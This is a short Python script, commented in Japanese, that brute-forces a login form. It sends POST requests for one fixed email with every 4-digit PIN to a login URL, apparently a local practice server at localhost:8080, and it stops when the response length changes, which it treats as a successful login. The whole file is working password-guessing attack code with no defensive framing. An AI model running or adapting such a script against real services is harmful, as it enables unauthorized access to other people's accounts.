import string
import itertools
import requests

nums = list(string.digits)
pins= list(itertools.product(nums, repeat=4))             
loop_len = len(pins)

for i in range(loop_len):
    pin_tuple = pins[i]    
    pin = ''.join(pin_tuple)
    #①  POSTパラメータをJSON形式で保持する
    data = {
            'email':'abc@abc.com',
            'passw':pin
            }
    #②  requestsライブラリを使って、リクエストを送る
    response = requests.post('http://localhost:8080/login',data = data)

    #③  最初は、１つ前の情報がないので対応させる
    if i == 0: 
        pre_response_len = len(response.text)
    response_len = len(response.text)
    print(f'{response_len}:{pin}')
    
    #④  1つ前のリクエストボディの長さが異なれば、ログイン成功とする
    if response_len != pre_response_len:
        break
    else:
        pre_response_len = response_len

